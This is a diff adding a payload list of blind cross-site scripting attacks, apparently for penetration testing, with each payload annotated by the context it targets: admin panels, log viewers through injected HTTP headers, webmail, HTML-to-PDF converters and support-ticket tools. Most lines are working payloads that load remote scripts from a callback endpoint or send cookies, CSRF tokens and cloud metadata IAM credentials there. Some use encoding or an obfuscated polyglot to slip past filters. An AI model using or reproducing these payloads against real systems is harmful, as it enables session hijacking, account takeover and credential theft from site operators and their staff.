@@ -1,0 +1,97 @@
+# Blind XSS Payloads
+# Designed for out-of-band execution on XSSHunter, Interactsh, or self-hosted listeners
+# Replace YOUR_OOB_ENDPOINT with your controlled callback URL
+# Annotated with the injection context each payload targets
+
+# ===== XSSHUNTER-COMPATIBLE POLYGLOTS =====
+# Context: general purpose — works across most reflection contexts
+
+"><script src="https://YOUR_OOB_ENDPOINT/probe.js"></script>
+# note: closes attribute and injects script tag — best for HTML attribute context
+
+'><script src="https://YOUR_OOB_ENDPOINT/probe.js"></script>
+# note: single-quote closer variant for single-quoted attributes
+
+</script><script src="https://YOUR_OOB_ENDPOINT/probe.js"></script>
+# note: closes existing script block before injecting — use when inside <script> content
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://YOUR_OOB_ENDPOINT/probe.js\';document.body.appendChild(a)')
+# note: for href/src attribute injection contexts
+
+\x3cscript src\x3d"https://YOUR_OOB_ENDPOINT/probe.js"\x3e\x3c/script\x3e
+# note: hex-encoded angle brackets — bypasses naive < > filters in some contexts
+
+# ===== ADMIN PANEL INJECTION =====
+# Context: user-supplied fields stored and rendered in admin dashboards
+# Targets internal tools that may have older browsers or relaxed CSP
+
+"><img src=x id=adminpanel onerror="var s=document.createElement('script');s.src='https://YOUR_OOB_ENDPOINT/probe.js';document.head.appendChild(s)">
+# note: img onerror avoids script tag filtering; works in innerHTML admin renderers
+
+<details open ontoggle="var s=document.createElement('script');s.src='https://YOUR_OOB_ENDPOINT/probe.js';document.head.appendChild(s)">
+# note: ontoggle executes without click — good for admin panels that render without JS execution enabled
+
+# ===== LOG VIEWER INJECTION =====
+# Context: User-Agent, X-Forwarded-For, Referer headers stored in logs
+# Log viewers often render plain HTML or use innerHTML for formatting
+
+"><script src="https://YOUR_OOB_ENDPOINT/probe.js"></script>
+# note: inject in User-Agent header — most common log field
+
+<script src="https://YOUR_OOB_ENDPOINT/probe.js">
+# note: inject in X-Forwarded-For header — some log tools render this field as HTML
+
+# HTTP headers to inject (use with Burp Repeater or custom script):
+# User-Agent: "><script src="https://YOUR_OOB_ENDPOINT/probe.js"></script>
+# Referer: https://"><script src="https://YOUR_OOB_ENDPOINT/probe.js"></script>
+# X-Forwarded-For: "><script src="https://YOUR_OOB_ENDPOINT/probe.js"></script>
+
+# ===== EMAIL CLIENT INJECTION =====
+# Context: HTML email rendered in webmail clients (Gmail, Outlook Web, etc.)
+# Most sanitize aggressively — use CSS-based exfil or data URIs as fallback
+
+# note: webmail clients block <script> — use event handlers on allowed tags
+<img src="https://YOUR_OOB_ENDPOINT/pixel.gif" onload="var s=document.createElement('script');s.src='https://YOUR_OOB_ENDPOINT/probe.js';document.head.appendChild(s)" style="width:1px;height:1px">
+
+# CSS-based token exfil via import (for webmail with style injection but no JS):
+<style>@import 'https://YOUR_OOB_ENDPOINT/css-exfil.css';</style>
+
+# SVG payload for email clients that allow SVG attachments:
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://YOUR_OOB_ENDPOINT/svg?c='+document.cookie)">
+
+# ===== PDF GENERATOR INJECTION =====
+# Context: User input rendered in server-side HTML-to-PDF converters
+# (wkhtmltopdf, PhantomJS, Chrome headless via puppeteer)
+# These often have network access and run JS with no CSP
+
+# Fetch internal endpoints (SSRF via JS in PDF renderer)
+<script>
+fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+  .then(r => r.text())
+  .then(d => fetch('https://YOUR_OOB_ENDPOINT/cloud-meta?d=' + encodeURIComponent(d)));
+</script>
+# note: wkhtmltopdf and older puppeteer execute this; modern headless Chrome blocks 169.254.x.x
+
+# Simpler PDF exfil — works even if internal network access is blocked:
+<script>
+document.write('<img src="https://YOUR_OOB_ENDPOINT/pdf-xss?title=' + encodeURIComponent(document.title) + '&url=' + encodeURIComponent(location.href) + '">');
+</script>
+
+# ===== SUPPORT TICKET / CHAT SYSTEMS =====
+# Context: User-submitted content reviewed by support agents in internal tools
+
+"><img src=x onerror="fetch('https://YOUR_OOB_ENDPOINT/st?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href))">
+# note: cookies from support agent's session — often has elevated privileges
+
+# Grab CSRF token from support tool (for account takeover escalation):
+"><img src=x onerror="fetch(location.href).then(r=>r.text()).then(t=>{var m=t.match(/csrf[_-]token[\"']?\s*[=:]\s*[\"']?([a-zA-Z0-9_-]{20,})/i);if(m)fetch('https://YOUR_OOB_ENDPOINT/csrf?t='+m[1])})">
+
+# ===== POLYGLOT SUITABLE FOR MULTIPLE BLIND CONTEXTS =====
+# Works in: HTML body, attribute (double-quoted), URL parameter, JSON string
+
+jaVasCript:eval('var s\x3ddocument.createElement("script");s.src\x3d"https://YOUR_OOB_ENDPOINT/probe.js";document.body.appendChild(s)')
+
+--></script><script src="https://YOUR_OOB_ENDPOINT/probe.js"><!--
+
+'/*\'/*`/*\"/*<html onmouseover=/**/eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,115,58,47,47,89,79,85,82,95,79,79,66,95,69,78,68,80,79,73,78,84,47,112,114,111,98,101,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41))>
+# note: String.fromCharCode encodes the full payload — bypasses string-based filters
